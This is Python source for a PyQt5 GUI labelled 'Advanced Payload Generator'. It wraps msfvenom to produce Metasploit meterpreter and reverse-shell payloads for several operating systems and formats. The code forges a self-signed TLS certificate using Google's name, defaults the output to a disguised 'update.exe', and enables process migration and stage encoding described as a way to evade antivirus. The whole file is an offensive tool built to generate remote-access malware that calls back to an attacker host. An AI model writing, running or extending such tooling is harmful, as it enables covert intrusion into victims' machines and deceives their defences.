import sys
import os
import subprocess
import shutil
from PyQt5.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QLabel, 
                             QLineEdit, QPushButton, QComboBox, QCheckBox, 
                             QGroupBox, QFileDialog, QMessageBox, QTextEdit,
                             QProgressBar, QSplitter, QFrame)
from PyQt5.QtCore import Qt, QThread, pyqtSignal
from PyQt5.QtGui import QFont, QColor

# ---------------------------------------------------------
# WORKER THREADS
# ---------------------------------------------------------
class MsfVenomWorker(QThread):
    finished = pyqtSignal(bool, str) # success, message

    def __init__(self, cmd_list):
        super().__init__()
        self.cmd_list = cmd_list

    def run(self):
        try:
            # Check for msfvenom
            if not shutil.which("msfvenom"):
                self.finished.emit(False, "Error: 'msfvenom' is not in your PATH.")
                return

            # Run command
            process = subprocess.Popen(
                self.cmd_list, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE, 
                text=True
            )
            stdout, stderr = process.communicate()
            
            if process.returncode == 0:
                # msfvenom writes info/size to stderr, which is actually success info here
                self.finished.emit(True, f"Payload Generated Successfully!\n\n{stderr}")
            else:
                self.finished.emit(False, f"Error Code {process.returncode}:\n{stderr}")
        except Exception as e:
            self.finished.emit(False, f"Execution Exception: {str(e)}")

class OpenSSLWorker(QThread):
    finished = pyqtSignal(bool, str)

    def __init__(self, output_path):
        super().__init__()
        self.output_path = output_path

    def run(self):
        try:
            if not shutil.which("openssl"):
                self.finished.emit(False, "Error: 'openssl' is not in your PATH.")
                return
            
            # Command to generate a self-signed PEM
            cmd = [
                "openssl", "req", "-new", "-newkey", "rsa:4096", "-days", "365", "-nodes", "-x509",
                "-subj", "/C=US/ST=Unknown/L=Unknown/O=Unknown/CN=www.google.com",
                "-keyout", self.output_path,
                "-out", self.output_path
            ]
            
            process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
            )
            stdout, stderr = process.communicate()
            
            if process.returncode == 0 and os.path.exists(self.output_path):
                self.finished.emit(True, f"Certificate created at:\n{self.output_path}")
            else:
                self.finished.emit(False, f"OpenSSL Error:\n{stderr}")
                
        except Exception as e:
            self.finished.emit(False, f"Execution Exception: {str(e)}")

# ---------------------------------------------------------
# MAIN WIDGET
# ---------------------------------------------------------
class PayloadGenWidget(QWidget):
    def __init__(self, project_folder=None, parent=None):
        super().__init__(parent)
        self.worker = None
        # Default to CWD if no project folder is provided
        self.project_folder = project_folder or os.getcwd()
        self.setup_ui()
        self.setup_styles()

    def setup_styles(self):
        self.setStyleSheet("""
            QWidget {
                background-color: #1e1e2f;
                color: #e0e0e0;
                font-family: 'Arial';
                font-size: 14px;
            }
            QGroupBox {
                border: 1px solid #4a4a5e;
                border-radius: 6px;
                margin-top: 5px;
                padding-top: 15px;
                font-weight: bold;
                color: #00d2ff;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                subcontrol-position: top left;
                left: 10px;
                padding: 0 3px;
                background-color: #1e1e2f; 
            }
            QLineEdit, QComboBox {
                background-color: #2f2f40;
                border: 1px solid #4a4a5e;
                border-radius: 4px;
                color: #ffffff;
                padding: 6px;
            }
            QLineEdit:focus, QComboBox:focus {
                border: 1px solid #00d2ff;
            }
            QPushButton { 
                background-color: #2f2f40;
                color: white; 
                font-weight: bold; 
                border: 1px solid #4a4a5e;
                border-radius: 6px; 
                padding: 8px;
            }
            QPushButton:hover {
                border-color: #00d2ff;
                color: #00d2ff;
            }
            QPushButton#ActionBtn {
                background-color: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #00d2ff, stop:1 #3a7bd5);
                border: none;
                color: white;
            }
            QPushButton#ActionBtn:hover {
                background-color: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #3a7bd5, stop:1 #00d2ff);
            }
            QTextEdit {
                background-color: #151520;
                border: 1px solid #4a4a5e;
                color: #00ff00;
                font-family: 'Courier New';
            }
            QCheckBox { spacing: 8px; color: #ccc; }
            QCheckBox::indicator {
                width: 16px; height: 16px;
                background-color: #2f2f40; border: 1px solid #4a4a5e; border-radius: 3px;
            }
            QCheckBox::indicator:checked {
                background-color: #00d2ff; border-color: #00d2ff;
            }
        """)

    def setup_ui(self):
        layout = QVBoxLayout(self)
        layout.setSpacing(10)
        layout.setContentsMargins(10, 10, 10, 10)

        # --- Header ---
        header_lbl = QLabel("📦 Advanced Payload Generator")
        header_lbl.setFont(QFont("Arial", 18, QFont.Bold))
        header_lbl.setStyleSheet("color: #00d2ff; margin-bottom: 5px;")
        layout.addWidget(header_lbl)

        # --- Path Info ---
        lbl_path = QLabel(f"Saving artifacts to: {os.path.join(self.project_folder, 'payloads')}")
        lbl_path.setStyleSheet("color: #888; font-style: italic; font-size: 12px; margin-bottom: 10px;")
        layout.addWidget(lbl_path)

        # --- Top Section: 2 Columns (SSL Gen vs Payload Config) ---
        top_layout = QHBoxLayout()
        top_layout.setSpacing(15)
        
        # 1. SSL CERT GENERATOR (Left)
        ssl_group = QGroupBox("1. Paranoid SSL Cert (OpenSSL)")
        ssl_layout = QVBoxLayout(ssl_group)
        ssl_layout.setSpacing(10)
        
        lbl_pem = QLabel("Generate a unified .pem file for 'handlersslcert'.")
        lbl_pem.setWordWrap(True)
        lbl_pem.setStyleSheet("color: #888; font-style: italic; font-size: 12px;")
        
        h_pem = QHBoxLayout()
        self.inp_pem_name = QLineEdit("justice.pem")
        self.btn_gen_pem = QPushButton("Generate PEM")
        self.btn_gen_pem.clicked.connect(self.generate_cert)
        h_pem.addWidget(self.inp_pem_name)
        h_pem.addWidget(self.btn_gen_pem)
        
        ssl_layout.addWidget(lbl_pem)
        ssl_layout.addLayout(h_pem)
        top_layout.addWidget(ssl_group, 1) 

        # 2. CONNECTION INFO (Right)
        conn_group = QGroupBox("2. Connection Details")
        conn_layout = QVBoxLayout(conn_group)
        conn_layout.setSpacing(10)
        
        grid_conn = QHBoxLayout()
        
        v_lhost = QVBoxLayout()
        v_lhost.setSpacing(2)
        v_lhost.addWidget(QLabel("LHOST:"))
        self.inp_lhost = QLineEdit("192.168.1.1")
        v_lhost.addWidget(self.inp_lhost)
        
        v_lport = QVBoxLayout()
        v_lport.setSpacing(2)
        v_lport.addWidget(QLabel("LPORT:"))
        self.inp_lport = QLineEdit("443")
        v_lport.addWidget(self.inp_lport)
        
        grid_conn.addLayout(v_lhost)
        grid_conn.addLayout(v_lport)
        conn_layout.addLayout(grid_conn)
        top_layout.addWidget(conn_group, 2) 

        layout.addLayout(top_layout)

        # --- Payload Configuration ---
        pay_group = QGroupBox("3. Payload Configuration")
        pay_layout = QVBoxLayout(pay_group)
        pay_layout.setSpacing(10)
        
        # Selection Grid
        sel_grid = QHBoxLayout()
        
        self.combo_os = QComboBox()
        self.combo_os.addItems(["windows", "linux", "android", "osx"])
        
        self.combo_arch = QComboBox()
        self.combo_arch.addItems(["x64", "x86"])
        
        self.combo_type = QComboBox()
        self.combo_type.addItems(["meterpreter", "shell"])
        
        self.combo_proto = QComboBox()
        self.combo_proto.addItems(["reverse_https", "reverse_tcp", "reverse_http", "bind_tcp"])
        
        sel_grid.addWidget(QLabel("OS:"))
        sel_grid.addWidget(self.combo_os)
        sel_grid.addWidget(QLabel("Arch:"))
        sel_grid.addWidget(self.combo_arch)
        sel_grid.addWidget(QLabel("Type:"))
        sel_grid.addWidget(self.combo_type)
        sel_grid.addWidget(QLabel("Conn:"))
        sel_grid.addWidget(self.combo_proto)
        
        pay_layout.addLayout(sel_grid)
        
        # Advanced Flags
        adv_grid = QHBoxLayout()
        self.chk_migrate = QCheckBox("PrependMigrate=true")
        self.chk_migrate.setChecked(True)
        self.chk_migrate.setToolTip("Spawns a new process and migrates shellcode into it immediately.")
        
        self.chk_encoding = QCheckBox("EnableStageEncoding=true")
        self.chk_encoding.setChecked(True)
        self.chk_encoding.setToolTip("Encodes the second stage of the payload to evade AV.")
        
        adv_grid.addWidget(self.chk_migrate)
        adv_grid.addWidget(self.chk_encoding)
        adv_grid.addStretch()
        pay_layout.addLayout(adv_grid)

        # Handler Cert Selection
        cert_layout = QHBoxLayout()
        self.chk_use_cert = QCheckBox("Use Handler SSL Cert:")
        self.chk_use_cert.setChecked(True)
        self.chk_use_cert.toggled.connect(lambda c: self.inp_cert_path.setEnabled(c))
        
        self.inp_cert_path = QLineEdit("justice.pem")
        self.btn_browse_cert = QPushButton("Browse")
        self.btn_browse_cert.clicked.connect(self.browse_cert)
        
        cert_layout.addWidget(self.chk_use_cert)
        cert_layout.addWidget(self.inp_cert_path)
        cert_layout.addWidget(self.btn_browse_cert)
        pay_layout.addLayout(cert_layout)

        layout.addWidget(pay_group)

        # --- Output Configuration ---
        out_group = QGroupBox("4. Output")
        out_layout = QHBoxLayout(out_group)
        
        self.combo_format = QComboBox()
        self.combo_format.addItems(["exe", "elf", "raw", "python", "powershell", "asp", "jsp"])
        self.combo_format.currentTextChanged.connect(self.update_filename_extension)
        
        self.inp_outfile = QLineEdit("update.exe")
        
        self.btn_generate = QPushButton("🚀 GENERATE PAYLOAD")
        self.btn_generate.setObjectName("ActionBtn")
        self.btn_generate.setMinimumHeight(40)
        self.btn_generate.setCursor(Qt.PointingHandCursor)
        self.btn_generate.clicked.connect(self.generate_payload)
        
        out_layout.addWidget(QLabel("Format:"))
        out_layout.addWidget(self.combo_format)
        out_layout.addWidget(QLabel("Filename:"))
        out_layout.addWidget(self.inp_outfile)
        out_layout.addSpacing(20)
        out_layout.addWidget(self.btn_generate, 1)
        
        layout.addWidget(out_group)

        # --- Output Console ---
        self.console = QTextEdit()
        self.console.setReadOnly(True)
        self.console.setPlaceholderText("Command output will appear here...")
        layout.addWidget(self.console)

    # --- HELPERS ---
    def get_payloads_dir(self):
        """Ensures the payloads directory exists and returns its path."""
        path = os.path.join(self.project_folder, "payloads")
        if not os.path.exists(path):
            try:
                os.makedirs(path)
            except OSError as e:
                self.console.append(f"[-] Error creating directory: {e}")
                return self.project_folder
        return path

    def browse_cert(self):
        start_dir = self.get_payloads_dir()
        f, _ = QFileDialog.getOpenFileName(self, "Select PEM Certificate", start_dir, "PEM Files (*.pem);;All Files (*)")
        if f:
            self.inp_cert_path.setText(f)

    def update_filename_extension(self, new_format):
        """Auto-updates the output filename extension based on format."""
        current_name = self.inp_outfile.text().strip()
        if not current_name: return

        # Map formats to extensions
        ext_map = {
            "exe": ".exe",
            "elf": ".elf",
            "raw": ".bin",
            "python": ".py",
            "powershell": ".ps1",
            "asp": ".asp",
            "jsp": ".jsp"
        }
        
        new_ext = ext_map.get(new_format, f".{new_format}")
        
        # Split name and ext
        base, _ = os.path.splitext(current_name)
        # If there was no extension, base is the whole name
        
        self.inp_outfile.setText(f"{base}{new_ext}")

    # --- GENERATION LOGIC ---
    def generate_cert(self):
        self.console.clear() # Clear console on new command
        name = self.inp_pem_name.text().strip()
        if not name: return
        
        save_dir = self.get_payloads_dir()
        full_path = os.path.join(save_dir, name)
        
        self.console.append(f"[*] Generating SSL Certificate: {full_path}...")
        self.worker = OpenSSLWorker(full_path)
        self.worker.finished.connect(self.on_worker_finished)
        self.worker.start()

    def generate_payload(self):
        self.console.clear() # Clear console on new command
        # 1. Build Payload String
        platform = self.combo_os.currentText()
        arch = self.combo_arch.currentText()
        ptype = self.combo_type.currentText()
        proto = self.combo_proto.currentText()
        payload_str = f"{platform}/{arch}/{ptype}/{proto}"
        
        lhost = self.inp_lhost.text().strip()
        lport = self.inp_lport.text().strip()
        fmt = self.combo_format.currentText()
        outfile_name = self.inp_outfile.text().strip()
        
        if not lhost or not lport:
            QMessageBox.warning(self, "Error", "LHOST and LPORT are required.")
            return

        # 2. Determine Output Path
        save_dir = self.get_payloads_dir()
        full_out_path = os.path.join(save_dir, outfile_name)

        # 3. Construct Command
        cmd = ["msfvenom", "-p", payload_str, f"LHOST={lhost}", f"LPORT={lport}"]
        
        if self.chk_migrate.isChecked() and platform == "windows" and ptype == "meterpreter":
            cmd.append("PrependMigrate=true")
        
        if self.chk_encoding.isChecked():
            cmd.append("EnableStageEncoding=true")
            
        if self.chk_use_cert.isChecked() and "https" in proto:
            cert_input = self.inp_cert_path.text().strip()
            
            # Check if Cert Exists
            cert_full_path = cert_input
            if not os.path.isabs(cert_input):
                cert_full_path = os.path.join(save_dir, cert_input)
                
            if not os.path.exists(cert_full_path):
                # Prompt User
                reply = QMessageBox.question(
                    self, 
                    "Certificate Not Found", 
                    f"The specified certificate was not found:\n{cert_full_path}\n\nmsfvenom might fail. Do you want to proceed anyway?",
                    QMessageBox.Yes | QMessageBox.No, 
                    QMessageBox.No
                )
                if reply == QMessageBox.No:
                    return # Stop generation
            
            # Add to command
            cmd.append(f"HandlerSSLCert={cert_full_path}")
        
        cmd.extend(["-f", fmt, "-o", full_out_path])

        # 4. Execute
        self.console.append(f"[*] Generating payload at: {full_out_path}")
        self.btn_generate.setEnabled(False)
        
        self.worker = MsfVenomWorker(cmd)
        self.worker.finished.connect(self.on_worker_finished)
        self.worker.start()

    def on_worker_finished(self, success, msg):
        self.btn_generate.setEnabled(True)
        if success:
            self.console.append(f"[+] SUCCESS:\n{msg}")
            self.console.append("-" * 40)
        else:
            self.console.append(f"[-] FAILED:\n{msg}")
            self.console.append("-" * 40)